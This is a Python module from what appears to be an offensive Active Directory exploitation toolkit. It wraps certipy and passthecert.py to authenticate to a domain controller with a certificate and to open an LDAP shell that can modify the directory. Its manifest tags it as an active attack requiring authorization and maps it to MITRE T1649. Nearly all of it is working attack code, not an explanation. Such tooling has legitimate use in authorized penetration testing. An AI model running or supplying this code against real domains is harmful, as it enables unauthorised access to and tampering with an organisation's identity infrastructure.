"""PassTheCert — authenticate with a certificate to LDAPS."""

from typing import Any

MANIFEST = {
    "capability_id": "adxpl.adcs.pass_the_cert.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["authentication", "ldap_modification"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1649"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    dc_ip = getattr(args, "dc_ip", None)
    cert_path = getattr(args, "template", None)

    print("[*] PassTheCert: LDAPS authentication with certificate")
    print("[*] Domain: {}  DC: {}".format(cred.domain, dc_ip or "auto"))

    import subprocess
    import shutil
    ptc = shutil.which("passthecert.py") or shutil.which("PassTheCert.py")
    certipy = shutil.which("certipy") or shutil.which("certipy-ad")

    if certipy and cert_path:
        cmd = [certipy, "auth", "-pfx", cert_path, "-dc-ip", dc_ip or ""]
        print("[*] CMD: {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        return result.returncode

    if ptc:
        cmd = [ptc, "-action", "ldap-shell", "-crt", cert_path or "cert.pem",
               "-key", "key.pem", "-domain", cred.domain,
               "-dc-ip", dc_ip or ""]
        print("[*] CMD: {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, capture_output=True, text=True)
        print(result.stdout)
        return result.returncode

    print("[!] Neither certipy nor PassTheCert found")
    return 1
